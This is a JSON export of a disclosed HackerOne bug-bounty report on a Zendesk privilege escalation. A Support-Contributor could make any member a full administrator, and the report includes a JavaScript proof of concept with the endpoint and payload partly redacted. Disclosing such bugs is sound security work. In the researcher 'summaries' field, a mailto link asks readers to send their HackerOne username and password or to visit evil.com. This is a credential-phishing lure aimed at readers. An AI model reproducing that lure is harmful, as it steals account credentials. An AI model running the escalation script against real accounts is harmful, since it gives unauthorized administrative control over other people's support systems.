{
  "id": 2188569,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMTg4NTY5",
  "url": "https://hackerone.com/reports/2188569",
  "title": "Privilege escalation - Support-Contributor to Support and Product Admin via `/api/v2/██████` . No ADMIN PRIVILEGE required.",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2023-10-01T12:00:39.937Z",
  "submitted_at": "2023-10-01T12:00:40.172Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "cybxis",
    "url": "/cybxis",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/2vrhyt530bbqsdrfgpe3dvolc4nk/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 205,
    "url": "https://hackerone.com/zendesk",
    "handle": "zendesk",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/vqazo0hs6n64m1y7wrfnhrao63p9/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/vqazo0hs6n64m1y7wrfnhrao63p9/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Zendesk",
      "twitter_handle": "",
      "website": "https://www.zendesk.com",
      "about": "At Zendesk we’re on a mission to simplify the complexity of business and make it easy for companies and customers to create connections. "
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": true,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-12-18T20:05:21.306Z",
  "bug_reporter_agreed_on_going_public_at": "2023-11-25T03:50:48.092Z",
  "team_member_agreed_on_going_public_at": "2023-12-18T20:05:21.141Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello team, I am reporting another privilege escalation issue where a lowest privilege member(Support-Contributor) to full Support and Product administrator.  Tested in Zendesk Enterprise(Sponsored) and Trial Account.\n\nFrom my past reports I was able to find privilege escalation issues on the endpoint `/api/███` . The difference is, to perform a privilege escalation on the said endpoint, there should be at least one Product Admin privilege on the actor's account but this report does not require any Admin privilege(just the lowest privilege alone).\n\n## Summary:\nThe [Contributor Role](https://support.zendesk.com/hc/en-us/articles/4408832171034-About-team-member-product-roles-and-access) is the lowest Support role in Zendesk. In the UI alone, as a contributor, the accessible pages and and endpoints are very limited. With this role, the members page is not even accessible or restricted. With these restrictions, escalating your own role seem to be impossible.\n\n##Improper Access Control to Privilege Escalation\nVulnerable Endpoint: `PUT /api███ HTTP/2`\n\nThe `/api████████` endpoint is used for API integration to █████. █████████ . However, the said endpoint does not validate the privilege of the user who is sending a request. With this bug, a member with even just the lowest privilege(Contributor) is able to escalate any members' privilege to `FULL ADMINISTRATOR` including its own privilege.\n\n## Browsers Verified In:\nLatest version of Chrome and Firefox\n\n##Exploit\n```javascript\n//Exploit\n//get csrf token and id\nvar xhttp = new XMLHttpRequest();\nxhttp.onreadystatechange = function() {\n    if (this.readyState == 4 && this.status == 200) {\n        var profile = JSON.parse(this.responseText);\n        var csrf = profile.user.authenticity_token;\n\t\tvar id = profile.user.id;\n        escalate(id, csrf);\n    }\n};\n\nxhttp.open(\"GET\", \"https://\" + document.domain + \"/api/v2/users/me.json\");\nxhttp.send();\n\n\n//privilege escalation function\nfunction escalate(id, csrf) {\n    var xhttp = new XMLHttpRequest();\n    xhttp.onreadystatechange = function() {\n        if (this.readyState == 4 && this.status == 200) {\n            console.log(this.responseText);\n        }\n    };\n\n    xhttp.open(\"PUT\", \"https://\" + document.domain + \"/api██████;\n    xhttp.setRequestHeader(\"X-Csrf-Token\", csrf);\n    xhttp.setRequestHeader(\"Content-Type\", \"application/json\");\n    xhttp.send(JSON.stringify(███));\n}\n```\n\n## Steps To Reproduce:\n`On owner/admin account`\n1. Go to https://<domain>.zendesk.com/admin/people/team/members/new\n2. Provide the name and email of the agent\n3. Click Next\n4. Set the Support role to CONTRIBUTOR\n5. Go to https://<domain>.zendesk.com/admin/people/team/members\n6. Click the profile on the invited user\n7. Now set the roles to Support-Contributor only and `DISABLE` any product access(just to prove that no other privilege is required).\n\n`On invited user`\n8. You will receive an email. Click it to accept the invitation\n9. Login the invited account\n10. Execute the exploit to escalate your privileges.\n\n## Demo And PoC\nOn Enterprise account\n███\nOn Trial account\n███\n\n## Impact\n\nPrivilege escalation - Support-Contributor to Support and Product Admin.",
  "weakness": {
    "id": 75,
    "name": "Privilege Escalation"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 57,
  "voters": [
    "muslimfrompk",
    "8910jq",
    "g3ksec",
    "0xotachi",
    "aziz0x48",
    "mrizzz",
    "spaceboy20",
    "zy9ard3",
    "shreyaschavhan",
    "captn0sharky1",
    "and 47 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 8.8,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 16067,
    "asset_type": "URL",
    "asset_identifier": "h1-your-domain.zendesk.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "id": 516391,
      "category": "researcher",
      "content": "[Email support@hackerone.com to view and download the redacted contents/attachments](mailto:support@hackerone.com&bcc=customer_support@wearehackerone.com&cc=customer_support@wearehackerone.com&subject=Get%20redacted%20contents&body=Send%20us%20your%20Hackerone%20username%20and%20password%20to%20view%20the%20redacted%20contents%20or%20go%20to%20https://www.evil.com/)",
      "updated_at": "2024-08-27T20:52:00.215Z",
      "can_view?": true,
      "can_create?": false,
      "attachments": [],
      "user": {
        "id": 1028233,
        "username": "cybxis",
        "name": "",
        "bio": "",
        "cleared": true,
        "verified": true,
        "website": null,
        "location": "",
        "created_at": "2020-04-07T10:20:04.603Z",
        "url": "https://hackerone.com/cybxis",
        "hackerone_triager": false,
        "hackerone_employee": false,
        "user_type": "hacker",
        "profile_picture_urls": {
          "small": "https://profile-photos.hackerone-user-content.com/variants/2vrhyt530bbqsdrfgpe3dvolc4nk/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
          "medium": "https://profile-photos.hackerone-user-content.com/variants/2vrhyt530bbqsdrfgpe3dvolc4nk/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
          "xtralarge": "https://hackerone.com/rails/active_storage/representations/redirect/eyJfcmFpbHMiOnsiZGF0YSI6Njk0MzMxMiwicHVyIjoiYmxvYl9pZCJ9fQ==--dc84372bad7deecd6d764e3690d48339eae371af/eyJfcmFpbHMiOnsiZGF0YSI6eyJmb3JtYXQiOiJwbmciLCJyZXNpemUiOiIyNjB4MjYwXHUwMDNlIn0sInB1ciI6InZhcmlhdGlvbiJ9fQ==--c155082ce6f9751dcb29cd6ea061a7e4d7329577/3bthumb.png"
        }
      }
    }
  ]
}
